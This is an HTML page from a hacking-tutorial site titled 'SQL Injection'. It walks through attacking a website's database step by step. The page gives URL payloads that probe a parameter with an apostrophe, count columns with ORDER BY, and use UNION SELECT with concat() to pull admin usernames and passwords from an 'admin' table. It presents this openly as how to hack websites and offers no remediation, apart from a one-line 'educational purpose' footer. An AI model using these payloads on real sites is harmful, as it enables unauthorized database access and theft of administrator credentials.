<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>SQL Injection</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="To check if the site is vulnerable to Sql injection first check the url if it is like this

www.site.com/file.php?id=7

To check the vulnerbility type appostrophy at the end of url so it will become like this

www.site.com/file.php?id=7'" />
	<meta name="keywords" content="How to hack databases of website using sql injection" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.4" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link href="css/107.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance680" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="News-1/" target="_self" title="News">News</a></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li></ul></div><div id="wb_element_instance681" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle"><span class="wb-stl-special"><span style="color:#bebebe;">HakTuts</span></span></h4>
</div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance685" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><span style="color:#bebebe;">SQL INJECTION</span></h1>

<p> </p>

<p><span style="color:#bebebe;">Now we are going to learn how to hack the sites which is vulnerable to Sql injection.So lets begin</span></p>

<p><span style="color:#bebebe;">To check if the site is vulnerable to Sql injection first check the url if it is like this</span></p>

<p><span style="color:#bebebe;">www.site.com/file.php?id=7</span></p>

<p><span style="color:#bebebe;">To check the vulnerbility type appostrophy at the end of url so it will become like this</span></p>

<p><span style="color:#bebebe;">www.site.com/file.php?id=7'</span></p>

<p><span style="color:#bebebe;">On hitting enter if you see this text on page</span></p>

<p><span style="color:#bebebe;">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc.</span></p>

<p><span style="color:#bebebe;">Then the website is vulnerable to this attack</span></p>

<p> </p>

<p class="wb-stl-normal"><strong><span style="color:#bebebe;">FINDING THE COLUMNS</span></strong></p>

<p><span style="color:#bebebe;">To find number of columns we use statement ORDER BY (tells database how to order the result). In order to use, we do increment until we get an error.</span></p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 order by 1 -- no error</span></p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 order by 2 -- no error</span></p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 order by 3 – error</span></p>

<p><span style="color:#bebebe;">so it means the site has 2 columns because we got error on 3th one.</span></p>

<p> </p>

<p><strong><span style="color:#bebebe;">CHECKING FOR UNION FUNCTION</span></strong></p>

<p><span style="color:#bebebe;">Our next is step is to check for union function. This is because with union function we can select more data in one statement only.</span></p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 union all select 1,2</span></p>

<p><span style="color:#bebebe;">till 2 because we discoverd the no of column was 2 so lets move on</span></p>

<p><span style="color:#bebebe;">If we see some numbers on screen, i.e. 1 or 2  that means the UNION works</span></p>

<p> </p>

<p><strong><span style="color:#bebebe;">GETTING TABLE AND COLUMN NAME</span></strong></p>

<p><span style="color:#bebebe;">This is for MySQL version less than 5</span></p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 union all select 1,2,3 from admin</span></p>

<p><span style="color:#bebebe;">We see number 2 on the screen like before. Now we know that table admin exists. Now to check column names we craft a query</span></p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 union all select 1,2,username from admin</span></p>

<p><span style="color:#bebebe;">We get username displayed on screen</span></p>

<p><span style="color:#bebebe;">Now to check for the column password</span></p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 union all select 1,2,password from admin</span></p>

<p> </p>

<p><span style="color:#bebebe;">If we got successful, we will see password on the screen. It can be in plain text or hash depending on how the database has been setup ?. Now we must complete the query. For that we can use concat() function (it joins strings</span></p>

<p> </p>

<p><span style="color:#bebebe;">http://www.site.com/news.php?id=7 union all select 1,2,concat(username,0x3a,password)from admin</span></p>

<p><span style="color:#bebebe;">Note that we put 0x3a, its hex value for so 0x3a is hex value for colon</span></p>

<p> </p>

<p><span style="color:#bebebe;">Now we get displayed username: password on screen</span></p>
</div><div id="wb_element_instance686" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(107);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance686");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance686").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 154px;">
	
<div id="wb_element_instance682" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">The Content of the website is for educational purpose.</p>
</div><div id="wb_element_instance683" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">haktuts © 2014. All Rights Reserved </p>
</div><div id="wb_element_instance684" class="wb_element"><div id="wb_element_instance684_toolbox" style="width: 200px; height: 30px;"><a id="wb_element_instance684_facebook" class="addthis_button_facebook addthis_32x32_style" style="float: left;"></a><a id="wb_element_instance684_twitter" class="addthis_button_twitter addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance684_email" class="addthis_button_email addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance684_google" class="addthis_button_google addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance684_compact" class="addthis_button_compact addthis_32x32_style" style="float: left; margin-left: 4px;"></a></div><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=haktuts.com"></script><script type="text/javascript">
				if (window.addthis) { addthis.toolbox("#wb_element_instance684_toolbox"); }
			</script></div><div id="wb_element_instance687" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(200);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>